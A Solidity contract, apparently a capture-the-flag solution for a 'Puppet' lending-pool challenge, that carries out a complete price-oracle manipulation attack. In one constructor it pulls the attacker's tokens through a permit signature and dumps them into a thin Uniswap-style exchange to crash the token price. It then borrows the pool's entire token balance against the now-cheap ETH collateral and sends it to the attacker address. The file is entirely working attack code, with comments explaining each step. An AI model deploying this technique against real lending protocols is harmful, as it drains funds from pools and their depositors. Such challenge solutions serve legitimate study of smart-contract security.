// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./RequiredInterfaces.sol";

contract Exploit_Puppet {
    constructor(
        IERC20Permit token,
        IUniswapExchange exchange,
        ILendingPool lendingPool,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) payable {
        uint256 DVTAmount = token.balanceOf(msg.sender);
        // Use the signature to approve on behalf of attackerEOA
        token.permit(
            msg.sender,
            address(this),
            type(uint256).max,
            type(uint256).max,
            v,
            r,
            s
        );
        // now we can transfer the tokens from attackerEOA to this contract
        token.transferFrom(msg.sender, address(this), DVTAmount);
        // Swap the entire token balance for ETH.
        // Since the pool has little liquidity there will be a massive inbalance in price after this swap
        token.approve(address(exchange), DVTAmount);
        exchange.tokenToEthSwapInput(DVTAmount, 1, block.timestamp + 1000);
        // Required collateral is now very low (19,67 ETH) compared to needed amount before the swap.
        lendingPool.borrow{value: address(this).balance}(
            token.balanceOf(address(lendingPool)),
            msg.sender //attackerEOA
        );
    }
}
